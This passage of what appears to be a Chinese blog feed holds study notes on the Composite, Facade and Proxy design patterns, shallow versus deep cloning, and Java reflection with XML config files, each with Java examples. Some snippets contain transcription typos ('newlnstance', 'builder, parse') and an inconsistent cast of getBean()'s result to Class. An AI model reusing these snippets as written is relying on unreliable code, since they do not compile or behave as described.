id="模式结构-2">模式结构</h3><h4 id="结构图-2">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231229125805145.png" alt="image-20231229125805145"></p><h4 id="实现代码-2">实现代码</h4><ul><li><p>抽象构件（Component）</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Component</span> &#123;</span><br><span class="line">    <span class="comment">//增加成员</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Component c)</span>; </span><br><span class="line">    <span class="comment">//删除成员</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Component c)</span>;</span><br><span class="line">    <span class="comment">//获取成员</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> Component <span class="title function_">getChild</span><span class="params">(<span class="type">int</span> i)</span>; </span><br><span class="line">    <span class="comment">// 业务方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>叶子构件（Leaf）</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Leaf</span> <span class="keyword">extends</span> <span class="title class_">Component</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Component c)</span> &#123;</span><br><span class="line">        <span class="comment">//异常处理或错误提示</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Component c)</span> &#123;</span><br><span class="line">        <span class="comment">//异常处理或错误提示</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getChild</span><span class="params">( <span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="comment">//异常处理或错误提示</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//叶子构件具体业务方法的实现</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>容器构件（Composite）</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.* ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Composite</span> <span class="keyword">extends</span> <span class="title class_">Component</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> ArrayList &lt;Component&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span> &lt;Component&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">add</span><span class="params">(Component c)</span> &#123;</span><br><span class="line">        list.add(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">remove</span><span class="params">(Component c)</span> &#123;</span><br><span class="line">        list.remove(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Component <span class="title function_">getChild</span><span class="params">(<span class="type">int</span> i)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Component)list.get(i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">operation</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//容器构件具体业务方法的实现，将递归调用成员构件的业务方法</span></span><br><span class="line">        <span class="keyword">for</span>(Object obj:list) &#123;</span><br><span class="line">            ((Component)obj).operation();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例-2">应用实例</h3><blockquote><p>某软件公司欲开发一个杀毒(Antivirus)软件，该软件既可以对某个文件夹(Folder)杀毒，也可以对某个指定的文件(File)进行杀毒。该杀毒软件还可以根据各类文件的特点，为不同类型的文件提供不同的杀毒方式，例如图像文件(ImageFile)和文本文件(TextFile)的杀毒方式就有所差异。现使用组合模式来设计该杀毒软件的整体框架。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231229130502078.png" alt="image-20231229130502078"></p><ul><li>抽象构件：<code>AbstractFile</code></li><li>容器构件：<code>Folder</code></li><li>叶子构件：<code>ImageFile</code>、<code>TextFile</code>、<code>VideoFile</code></li></ul><h3 id="模式变化">模式变化</h3><h4 id="透明组合模式">透明组合模式</h4><ul><li><p>抽象构件Component中声明了所有用于管理成员对象的方法，包括add()、remove()，以及getChild()等方法</p></li><li><p>在客户端看来，叶子对象与容器对象所提供的方法是一致的，客户端可以一致地对待所有的对象</p></li><li><p>缺点是不够安全，因为叶子对象和容器对象在本质上是有区别的</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231229130843722.png" alt="image-20231229130843722"></p></li></ul><h4 id="安全组合模式">安全组合模式</h4><ul><li><p>抽象构件Component中没有声明任何用于管理成员对象的方法，而是在Composite类中声明并实现这些方法</p></li><li><p>对于叶子对象，客户端不可能调用到这些方法</p></li><li><p>缺点是不够透明，客户端不能完全针对抽象编程，必须有区别地对待叶子构件和容器构件</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231229130915270.png" alt="image-20231229130915270"></p></li></ul><h3 id="特点及使用环境-2">特点及使用环境</h3><h4 id="优点-2">优点</h4><ol><li>可以清楚地定义分层次的复杂对象，表示对象的全部或部分层次，让客户端忽略了层次的差异，方便对整个层次结构进行控制</li><li>客户端可以一致地使用一个组合结构或其中单个对象，不必关心处理的是单个对象还是整个组合结构，简化了客户端代码</li><li>增加新的容器构件和叶子构件都很方便，符合开闭原则</li><li>为树形结构的面向对象实现提供了一种灵活的解决方案</li></ol><h4 id="缺点-2">缺点</h4><ol><li>在增加新构件时很难对容器中的构件类型进行限制</li></ol><h4 id="适用环境-2">适用环境</h4><ol><li>在具有整体和部分的层次结构中，希望通过一种方式忽略整体与部分的差异，客户端可以一致地对待它们</li><li>在一个使用面向对象语言开发的系统中需要处理一个树形结构</li><li>在一个系统中能够分离出叶子对象和容器对象，而且它们的类型不固定，需要增加一些新的类型</li></ol><h2 id="装饰模式✲">装饰模式✲</h2><h2 id="外观模式★-Facade">外观模式★(Facade)</h2><div class="tip "><p><strong>定义</strong>：</p><p>为子系统中的一组接口提供一个统一的入口。外观模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。</p></div><p><img src="https://oss.iuoyt.com/img/posts/image-20231229131346810.png" alt="image-20231229131346810"></p><h3 id="模式结构-3">模式结构</h3><h4 id="结构图-3">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231229131357167.png" alt="image-20231229131357167"></p><h4 id="实现代码-3">实现代码</h4><ul><li><p>外观角色（Facade）</p><p>在客户端可以调用它的方法，在外观角色中可以知道相关的(一个或者多个)子系统的功能和责任；在正常情况下，它将所有从客户端发来的请求委派到相应的子系统，传递给相应的子系统对象处理。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Facade</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">SubSystemA</span> <span class="variable">objl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubSystemA</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">SubSystemB</span> <span class="variable">obj2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubSystemB</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="type">SubSystemC</span> <span class="variable">obj3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SubSystemC</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">        objl.methodA();</span><br><span class="line">        obj2.methodB();</span><br><span class="line">        obj3.methodC();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>子系统角色（SubSystem）</p><p>在软件系统中可以有一个或者多个子系统角色，每一个子系统可以不是一个单独的类，而是一个类的集合，它实现子系统的功能；每一个子系统都可以被客户端直接调用，或者被外观角色调用，它处理由外观类传过来的请求；子系统并不知道外观的存在，对于子系统而言，外观角色仅仅是另外一个客户端而已。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SubSystemA</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodA</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//业务实现代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SubSystemB</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodB</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//业务实现代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SubSystemC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodC</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//业务实现代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例-3">应用实例</h3><blockquote><p>某软件公司要开发一个可应用于多个软件的文件加密模块，该模块可以对文件中的数据进行加密并将加密之后的数据存储在一个新文件中，具体的流程包括3个部分，分别是读取源文件、加密、保存加密之后的文件，其中，读取文件和保存文件使用流来实现，加密操作通过求模运算实现。这3个操作相对独立，为了实现代码的独立重用，让设计更符合单一职责原则，这3个操作的业务代码封装在3个不同的类中。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231229131857710.png" alt="image-20231229131857710"></p><ul><li>外观类：<code>EncryptFacade</code></li><li>子系统类：<code>FileReader</code>、<code>CipherMachine</code>、<code>FileWriter</code></li></ul><h3 id="特点及使用环境-3">特点及使用环境</h3><h4 id="优点-3">优点</h4><ol><li>它对客户端屏蔽了子系统组件，减少了客户端所需处理的对象数目，并使得子系统使用起来更加容易</li><li>它实现了子系统与客户端之间的松耦合关系，这使得子系统的变化不会影响到调用它的客户端，只需要调整外观类即可</li><li>一个子系统的修改对其他子系统没有任何影响，而且子系统的内部变化也不会影响到外观对象</li></ol><h4 id="缺点-3">缺点</h4><ol><li>不能很好地限制客户端直接使用子系统类，如果对客户端访问子系统类做太多的限制则减少了可变性和灵活性</li><li>如果设计不当，增加新的子系统可能需要修改外观类的源代码，违背了开闭原则</li></ol><h4 id="适用环境-3">适用环境</h4><ol><li>要为访问一系列复杂的子系统提供一个简单入口</li><li>客户端程序与多个子系统之间存在很大的依赖性</li><li>在层次化结构中，可以使用外观模式的定义系统中每一层的入口，层与层之间不直接产生联系，而是通过外观类建立联系，降低层之间的耦合度</li></ol><h2 id="享元模式☒">享元模式☒</h2><h2 id="代理模式-Proxy">代理模式(Proxy)</h2><div class="tip "><p><strong>定义</strong>：</p><p>给某一个对象提供一个代理或占位符，并由代理对象来控制对原对象的访问。</p></div><h3 id="模式结构-4">模式结构</h3><h4 id="结构图-4">结构图</h4><p><img src="https://oss.iuoyt.com/img/posts/image-20231229144858539.png" alt="image-20231229144858539"></p><h4 id="实现代码-4">实现代码</h4><ul><li><p>抽象主题角色（Subject）</p><p>它声明了真实主题和代理主题的共同接口，这样一来在任何使用真实主题的地方都可以使用代理主题，客户端通常需要针对抽象主题角色进行编程。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Subject</span> &#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">request</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>代理主题角色（Proxy）</p><p>它包含了对真实主题的引用，从而可以在任何时候操作真实主题对象；在代理主题角色中提供了一个与真实主题角色相同的接口，以便在任何时候都可以替代真实主题；代理主题角色还可以控制对真实主题的使用，负责在需要的时候创建和删除真实主题对象，并对真实主题对象的使用加以约束。通常，在代理主题角色中客户端在调用所引用的真实主题操作之前或之后还需要执行其他操作，而不仅仅是单纯调用真实主题对象中的操作。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Proxy</span> <span class="keyword">extends</span> <span class="title class_">Subject</span> &#123;</span><br><span class="line">    <span class="comment">//维持一个对真实主题对象的引用</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">RealSubject</span> <span class="variable">realSubject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RealSubject</span>();  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">preRequest</span><span class="params">()</span> &#123;</span><br><span class="line">        ……</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">request</span><span class="params">()</span> &#123;</span><br><span class="line">        preRequest();</span><br><span class="line">        <span class="comment">//调用真实主题对象的方法</span></span><br><span class="line">        realSubject.request();  </span><br><span class="line">        postRequest();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">postRequest</span><span class="params">()</span> &#123;</span><br><span class="line">        ……</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>真实主题角色（RealSubject）</p><p>它定义了代理角色所代表的真实对象，在真实主题角色中实现了真实的业务操作，客户端可以通过代理主题角色间接调用真实主题角色中定义的操作。</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RealSubject</span> <span class="keyword">extends</span> <span class="title class_">Subject</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">request</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//业务方法具体实现代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="应用实例-4">应用实例</h3><blockquote><p>某软件公司承接了某信息咨询公司的收费商务信息查询系统的开发任务，该系统的基本需求如下：</p><p>(1) 在进行商务信息查询之前用户需要通过身份验证，只有合法用户才能够使用该查询系统；</p><p>(2) 在进行商务信息查询时系统需要记录查询日志，以便根据查询次数收取查询费用。</p><p>该软件公司开发人员已完成了商务信息查询模块的开发任务，现希望能够以一种松耦合的方式向原有系统增加身份验证和日志记录功能，客户端代码可以无区别地对待原始的商务信息查询模块和增加新功能之后的商务信息查询模块，而且可能在将来还要在该信息查询模块中增加一些新的功能。</p></blockquote><p><img src="https://oss.iuoyt.com/img/posts/image-20231229145241223.png" alt="image-20231229145241223"></p><ul><li>抽象主题角色：<code>Searcher</code></li><li>真实主题角色：<code>RealSearcher</code></li><li>代理主题角色：<code>ProxySearcher</code></li><li>其他业务类：<ul><li><code>AccessValidator</code>：验证用户身份</li><li><code>Logger</code>：记录用户查询日志</li></ul></li></ul><h3 id="模式变化-2">模式变化</h3><h4 id="远程代理">远程代理</h4><ul><li><p>客户端程序可以访问在远程主机上的对象，远程主机可能具有更好的计算性能与处理速度，可以快速地响应并处理客户端的请求</p></li><li><p>可以将网络的细节隐藏起来，使得客户端不必考虑网络的存在</p></li><li><p>客户端完全可以认为被代理的远程业务对象是在本地而不是在远程，而远程代理对象承担了大部分的网络通信工作，并负责对远程业务方法的调用</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231229145646331.png" alt="image-20231229145646331"></p></li></ul><h4 id="虚拟代理">虚拟代理</h4><ul><li>对于一些占用系统资源较多或者加载时间较长的对象，可以给这些对象提供一个虚拟代理</li><li>在真实对象创建成功之前虚拟代理扮演真实对象的替身，而当真实对象创建之后，虚拟代理将用户的请求转发给真实对象</li><li>使用一个“虚假”的代理对象来代表真实对象，通过代理对象来间接引用真实对象，可以在一定程度上提高系统的性能</li></ul><h4 id="Java动态代理">Java动态代理</h4><ul><li>动态代理可以让系统在运行时根据实际需要来动态创建代理类，让同一个代理类能够代理多个不同的真实主题类而且可以代理不同的方法</li><li>Java语言提供了对动态代理的支持，Java语言实现动态代理时需要用到位于<code>java.lang.reflect</code>包中的一些类<ul><li>Proxy类<ul><li><code>public static Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces)</code>：该方法用于返回一个Class类型的代理类，在参数中需要提供类加载器并需要指定代理的接口数组（与真实主题类的接口列表一致）</li><li><code>public static Object newProxyInstance(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</code>：该方法用于返回一个动态创建的代理类的实例，方法中第一个参数loader表示代理类的类加载器，第二个参数interfaces表示代理类所实现的接口列表（与真实主题类的接口列表一致），第三个参数h表示所指派的调用处理程序类</li></ul></li><li>InvocationHandler接口<ul><li>InvocationHandler接口是代理处理程序类的实现接口，该接口作为代理实例的调用处理者的公共父类，每一个代理类的实例都可以提供一个相关的具体调用处理者（InvocationHandler接口的子类）</li><li><code>public Object invoke(Object proxy, Method method, Object[] args)</code>：该方法用于处理对代理类实例的方法调用并返回相应的结果，当一个代理实例中的业务方法被调用时将自动调用该方法。invoke()方法包含三个参数，其中第一个参数proxy表示代理类的实例，第二个参数method表示需要代理的方法，第三个参数args表示代理方法的参数数组</li></ul></li></ul></li><li>动态代理类需要在运行时指定所代理真实主题类的接口，客户端在调用动态代理对象的方法时，调用请求会将请求自动转发给InvocationHandler对象的<code>invoke()</code>方法，由<code>invoke()</code>方法来实现对请求的统一处理。</li></ul><h3 id="特点及使用环境-4">特点及使用环境</h3><h4 id="优点-4">优点</h4><ol><li>能够协调调用者和被调用者，在一定程度上降低了系统的耦合度</li><li>客户端可以针对抽象主题角色进行编程，增加和更换代理类无须修改源代码，符合开闭原则，系统具有较好的灵活性和可扩展性</li><li>各代理方式：<ol><li>远程代理：可以将一些消耗资源较多的对象和操作移至性能更好的计算机上，提高了系统的整体运行效率</li><li>虚拟代理：通过一个消耗资源较少的对象来代表一个消耗资源较多的对象，可以在一定程度上节省系统的运行开销</li><li>缓冲代理：为某一个操作的结果提供临时的缓存存储空间，以便在后续使用中能够共享这些结果，优化系统性能，缩短执行时间</li><li>保护代理：可以控制对一个对象的访问权限，为不同用户提供不同级别的使用权限</li></ol></li></ol><h4 id="缺点-4">缺点</h4><ol><li>由于在客户端和真实主题之间增加了代理对象，因此有些类型的代理模式可能会造成请求的处理速度变慢（例如保护代理）</li><li>实现代理模式需要额外的工作，而且有些代理模式的实现过程较为复杂（例如远程代理）</li></ol><h4 id="适用环境-4">适用环境</h4><ol><li>当客户端对象需要访问远程主机中的对象时可以使用远程代理</li><li>当需要用一个消耗资源较少的对象来代表一个消耗资源较多的对象，从而降低系统开销、缩短运行时间时可以使用虚拟代理</li><li>当需要为某一个被频繁访问的操作结果提供一个临时存储空间，以供多个客户端共享访问这些结果时可以使用缓冲代理</li><li>当需要控制对一个对象的访问，为不同用户提供不同级别的访问权限时可以使用保护代理</li><li>当需要为一个对象的访问（引用）提供一些额外的操作时可以使用智能引用代理</li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深克隆与浅克隆</title>
      <link href="/posts/316792e4.html"/>
      <url>/posts/316792e4.html</url>
      
        <content type="html"><![CDATA[<h2 id="浅克隆-Shallow-Clone">浅克隆(Shallow Clone)</h2><ul><li><p>在浅克隆中，如果原型对象的成员变量是值类型(如int、double、byte、boolean、char等基本数据类型)，将复制一份给克隆对象；如果原型对象的成员变量是引用类型（如类、接口、数组等复杂数据类型），则将引用对象的地址复制一份给克隆对象，也就是说原型对象和克隆对象的成员变量指向相同的内存地址。简单来说，在浅克隆中，当原型对象被复制时只复制它本身和其中包含的值类型的成员变量，而引用类型的成员变量并没有复制。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231228150057812.png" alt="image-20231228150057812"></p></li></ul><h2 id="深克隆-Deep-Clone">深克隆(Deep Clone)</h2><ul><li><p>在深克隆中，无论原型对象的成员变量是值类型还是引用类型，都将复制一份给克隆对象，深克隆将原型对象的所有引用对象也复制一份给克隆对象。简单来说，在深克隆中，除了对象本身被复制外，对象所包含的所有成员变量也将被复制。</p><p><img src="https://oss.iuoyt.com/img/posts/image-20231228164944861.png" alt="image-20231228164944861"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设计模式 </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射机制与配置文件</title>
      <link href="/posts/896ca548.html"/>
      <url>/posts/896ca548.html</url>
      
        <content type="html"><![CDATA[<h2 id="Java反射机制">Java反射机制</h2><ul><li><p>Java反射（Java Reflection）是指在程序运行时获取已知名称的类或已有对象的相关信息的一种机制，包括类的方法、属性、父类等信息，还包括实例的创建和实例类型的判断等。在反射中使用最多的类是Class，Class类的实例表示正在运行的Java应用程序中的类和接口，其<code>forName(String className)</code>方法可以返回与带有给定字符串名的类或接口相关联的 Class对象，再通过Class对象的<code>newInstance()</code>方法创建此对象所表示的类的一个新实例， 即通过一个类名字符串得到类的实例。</p></li><li><p>例如创建一个字符串类型的对象，其代码如下：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//通过类名生成实例对象并将其返回</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c. newlnstance();</span><br><span class="line"><span class="keyword">return</span> obj;</span><br></pre></td></tr></table></figure></li><li><p>此外，在JDK中还提供了<code>java.lang.reflect</code>包，封装了其他与反射相关的类。</p></li></ul><h2 id="配置文件">配置文件</h2><ul><li><p>软件系统的配置文件通常为XML文件，可以使用DOM （Document Object Model）、SAX（Simple API for XML）、StAX（Streaming API for XML）等技术来处理 XML 文件。</p></li><li><p>在实际开发中可以把类名存储到XML配置文件中，再读取配置文件获取类名字符串，然后通过Java反射机制来创建对象。</p>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- config.xml --&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">config</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">className</span>&gt;</span> java.lang.String <span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">config</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>为了读取该配置文件，并通过存储在其中的类名字符串反射生成对象，可以创建一个工具类XMLUtil，其详细代码如下：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> getXmlTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.parsers.* ;</span><br><span class="line"><span class="keyword">import</span> org.w3c.dom.* ;</span><br><span class="line"><span class="keyword">import</span> java.io.* ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XMLUtil</span> &#123;</span><br><span class="line">    <span class="comment">//该方法用于从XML配置文件中提取具体类的类名，并返回一个实例对象</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getBean</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//创建DOM文档对象</span></span><br><span class="line">            <span class="type">DocumentBuilderFactory</span> <span class="variable">dFactory</span> <span class="operator">=</span> DocumentBuilderFactory.newlnstance();</span><br><span class="line">            <span class="type">DocumentBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> dFactory.newDocumentBuilder();</span><br><span class="line">            Document doc;</span><br><span class="line">            doc = builder, parse(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;src//getXmlTest//config.xml&quot;</span>));</span><br><span class="line">            <span class="comment">//获取包含类名的文本结点</span></span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">nl</span> <span class="operator">=</span> doc.getElementsByTagName(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">            <span class="type">Node</span> <span class="variable">classNode</span> <span class="operator">=</span> nl.item(<span class="number">0</span>).getFirstChild();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cName</span> <span class="operator">=</span> classNode.getNodeValue();</span><br><span class="line">            <span class="comment">//通过类名生成实例对象并将其返回</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(cName);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newlnstance();</span><br><span class="line">            <span class="keyword">return</span> obj;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>具体使用：</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//getBean()的返回类型为Object，需要进行强制类型转换</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> (Class)XMLUtil.getBean();</span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> c.newInstance();</span><br><span 